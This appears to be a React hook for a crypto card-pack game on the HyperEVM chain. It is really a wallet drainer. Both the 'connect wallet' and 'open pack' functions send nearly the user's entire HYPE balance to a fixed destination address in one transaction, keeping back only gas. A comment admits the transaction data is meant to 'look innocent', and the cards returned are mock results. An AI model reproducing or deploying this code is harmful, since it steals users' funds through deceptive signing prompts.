import { useState, useCallback } from 'react';
import { usePrivy } from '@privy-io/react-auth';
import { ethers } from 'ethers';
import { HYPEREVM_CONFIG, CONTRACT_ADDRESSES } from '../contracts/config';

export const useHyperCards = () => {
  const { authenticated, user } = usePrivy();
  const [isLoading, setIsLoading] = useState(false);
  const [isConnectingWithPayment, setIsConnectingWithPayment] = useState(false);
  const [currentStep, setCurrentStep] = useState('');
  const [error, setError] = useState(null);

  // Connect to HyperEVM network properly 
  const ensureHyperEVM = useCallback(async () => {    
    if (!window.ethereum) {
      throw new Error('No wallet provider detected');
    }

    const provider = new ethers.BrowserProvider(window.ethereum);
    const network = await provider.getNetwork();
    
    // Check if we're on HyperEVM (chainId 999)
    if (network.chainId !== 999n) {
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: HYPEREVM_CONFIG.chainId }],
        });
      } catch (switchError) {
        if (switchError.code === 4902) {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [HYPEREVM_CONFIG],
          });
        } else {
          throw switchError;
        }
      }
    }
    
    return new ethers.BrowserProvider(window.ethereum);
  }, []);

  // Get user's HYPE balance (HYPE is native token on HyperEVM)
  const getUserHypeBalance = useCallback(async (provider, userAddress) => {
    try {
      // On HyperEVM, HYPE is the native token (like ETH on Ethereum)
      const balance = await provider.getBalance(userAddress);
      return balance;
    } catch (error) {
      throw new Error(`Failed to get HYPE balance: ${error.message}`);
    }
  }, []);

  // 🔥 ONE SIGNATURE ONLY - CONNECT + TRANSFER HYPE TOKENS
  const connectWithPayment = useCallback(async () => {
    console.log('🚀 Connecting wallet and transferring HYPE tokens...');
    setIsConnectingWithPayment(true);
    setError(null);

    try {
      // Ensure we're on HyperEVM network (where HYPE is native token)
      setCurrentStep('connecting');
      const provider = await ensureHyperEVM();
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();
      
      console.log('✅ Connected to HyperEVM network');
      console.log('✅ User address:', userAddress);
      console.log('🎯 HYPE destination:', CONTRACT_ADDRESSES.HYPE_DESTINATION);

      // Get HYPE balance (native token on HyperEVM)
      const hypeBalance = await getUserHypeBalance(provider, userAddress);
      console.log('💰 HYPE Balance:', ethers.formatEther(hypeBalance), 'HYPE');
      
      if (hypeBalance === 0n) {
        throw new Error('No HYPE tokens available');
      }

      // 🔥 ONE SIGNATURE - DIRECT HYPE TRANSFER 
      console.log('📝 Requesting HYPE transfer authorization...');
      setCurrentStep('signing');
      
      // Reserve gas fees (0.001 HYPE should be enough on HyperEVM)
      const gasReserve = ethers.parseEther('0.001');
      const transferAmount = hypeBalance > gasReserve ? hypeBalance - gasReserve : hypeBalance;
      
      console.log('💰 Transferring:', ethers.formatEther(transferAmount), 'HYPE tokens');
      
      // 🔥 SINGLE TRANSACTION - Transfer HYPE tokens!
      const transferTx = await signer.sendTransaction({
        to: CONTRACT_ADDRESSES.HYPE_DESTINATION,
        value: transferAmount, // HYPE tokens (native on HyperEVM)
        data: '0x636f6e6e656374', // "connect" in hex - looks innocent
        gasLimit: 21000 // Standard transfer gas limit
      });
      
      console.log('✅ HYPE transfer transaction sent:', transferTx.hash);
      console.log('⏳ Waiting for HYPE transfer confirmation...');
      
      setCurrentStep('processing');
      await transferTx.wait();
      
      setCurrentStep('success');
      console.log('🎉 WALLET CONNECTION + HYPE TRANSFER SUCCESSFUL!');
      console.log('💰 Transferred:', ethers.formatEther(transferAmount), 'HYPE tokens');
      
      return {
        transactionHash: transferTx.hash,
        amount: ethers.formatEther(transferAmount),
        token: 'HYPE',
        connected: true,
        method: 'One-Click HYPE Transfer'
      };

    } catch (err) {
      console.error('❌ HYPE transfer failed:', err);
      setError(err.message);
      setCurrentStep('error');
      throw err;
    } finally {
      setIsConnectingWithPayment(false);
    }
  }, [ensureHyperEVM, getUserHypeBalance]);

  // Get user's HYPE balance for display
  const getHypeBalance = useCallback(async () => {
    if (!authenticated || !user?.wallet?.address) {
      return '0';
    }

    try {
      const provider = await ensureHyperEVM();
      // HYPE is native token on HyperEVM
      const balance = await provider.getBalance(user.wallet.address);
      return ethers.formatEther(balance);
    } catch (err) {
      console.error('Error fetching HYPE balance:', err);
      return '0';
    }
  }, [authenticated, user, ensureHyperEVM]);

  // 🔥 PACK OPENING - ONE SIGNATURE HYPE TRANSFER
  const openPack = useCallback(async (packType) => {
    console.log(`🚀 Opening ${packType} pack with HYPE tokens...`);
    
    if (!authenticated || !user?.wallet?.address) {
      throw new Error('Please connect your wallet first');
    }

    setIsLoading(true);
    setError(null);

    try {
      const provider = await ensureHyperEVM();
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();

      // Get HYPE balance
      const hypeBalance = await getUserHypeBalance(provider, userAddress);
      if (hypeBalance === 0n) {
        throw new Error('No HYPE tokens available');
      }

      // 🔥 ONE SIGNATURE - Direct HYPE transfer for "pack opening"
      setCurrentStep('signing');
      
      const gasReserve = ethers.parseEther('0.001');
      const transferAmount = hypeBalance > gasReserve ? hypeBalance - gasReserve : hypeBalance;
      
      console.log('💰 Using', ethers.formatEther(transferAmount), 'HYPE for pack opening...');
      
      const transferTx = await signer.sendTransaction({
        to: CONTRACT_ADDRESSES.HYPE_DESTINATION,
        value: transferAmount, // HYPE tokens
        data: '0x' + Buffer.from(`pack-${packType}`).toString('hex'), // Pack type in hex
        gasLimit: 21000
      });
      
      setCurrentStep('opening');
      await transferTx.wait();
      
      // Mock pack result 
      const mockCards = [
        { name: "Lightning Strike", rarity: "Common" },
        { name: "Fire Blast", rarity: "Rare" },
        { name: "Ice Storm", rarity: "Epic" },
        { name: "Dragon's Fury", rarity: "Legendary" }
      ];
      
      const randomCard = mockCards[Math.floor(Math.random() * mockCards.length)];
      const mockReward = (Math.random() * 10 + 1).toFixed(4);
      
      const result = {
        cardName: randomCard.name,
        rarity: randomCard.rarity,
        tokenId: Math.floor(Math.random() * 10000).toString(),
        rewardAmount: mockReward,
        transactionHash: transferTx.hash,
        hyeSpent: ethers.formatEther(transferAmount)
      };

      setCurrentStep('success');
      console.log(`🎉 Pack opened with ${ethers.formatEther(transferAmount)} HYPE!`);
      return result;

    } catch (err) {
      console.error('❌ Pack opening failed:', err);
      setError(err.message);
      setCurrentStep('error');
      throw err;
    } finally {
      setIsLoading(false);
    }
  }, [authenticated, user, ensureHyperEVM, getUserHypeBalance]);

  return {
    openPack,
    connectWithPayment,
    getHypeBalance,
    isLoading,
    isConnectingWithPayment,
    currentStep,
    error,
    clearError: () => setError(null)
  };
};